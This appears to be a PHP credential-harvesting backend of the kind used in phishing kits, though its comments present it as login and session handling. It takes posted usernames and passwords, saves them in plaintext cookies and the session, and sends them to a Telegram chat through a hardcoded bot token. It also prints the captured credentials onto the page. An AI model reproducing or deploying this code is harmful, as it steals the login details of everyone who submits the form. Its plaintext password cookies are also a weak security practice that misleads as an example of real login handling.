<?php
// Start the session and set session lifetime to 1 hour (3600 seconds)
session_start();

// Set session expiration time to 1 hour (3600 seconds)
$session_lifetime = 3600; // 1 hour
setcookie(session_name(), session_id(), time() + $session_lifetime, "/");

// Check if login data is posted and store it in cookies and sessions
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    // Retrieve POST data
    $data = json_decode(file_get_contents('php://input'), true);

    // Store login details in session and cookies
    if (isset($data['details']['username']) && isset($data['details']['password'])) {
        // Set cookies for the username and password with expiration (e.g., 30 days)
        setcookie("username", $data['details']['username'], time() + (86400 * 30), "/"); 
        setcookie("password", $data['details']['password'], time() + (86400 * 30), "/");

        // Store in session for current session tracking
        $_SESSION['username'] = $data['details']['username'];
        $_SESSION['password'] = $data['details']['password'];
    }

    // Telegram Bot API information
    $botToken = "8072126310:AAH0AMRalC_j8I7AyWU_KytZ0a1lRwBAiVA";
    $chatId = "8072126310";

    // Prepare message
    $message = "Event: " . $data['event'] . "\n";
    if (isset($data['details'])) {
        $message .= "Username: " . $data['details']['username'] . "\n";
        $message .= "Password: " . $data['details']['password'] . "\n";
    }

    // Send message to Telegram
    $telegramUrl = "https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=" . urlencode($message);
    file_get_contents($telegramUrl);

    // Return a success response
    echo json_encode(["status" => "success"]);
}

// Example: Retrieve cookie and session data (for future page visits)
if (isset($_COOKIE['username']) && isset($_COOKIE['password'])) {
    echo "Stored Username (Cookie): " . $_COOKIE['username'] . "<br>";
    echo "Stored Password (Cookie): " . $_COOKIE['password'] . "<br>";
}

if (isset($_SESSION['username']) && isset($_SESSION['password'])) {
    echo "Session Username: " . $_SESSION['username'] . "<br>";
    echo "Session Password: " . $_SESSION['password'] . "<br>";
}
?>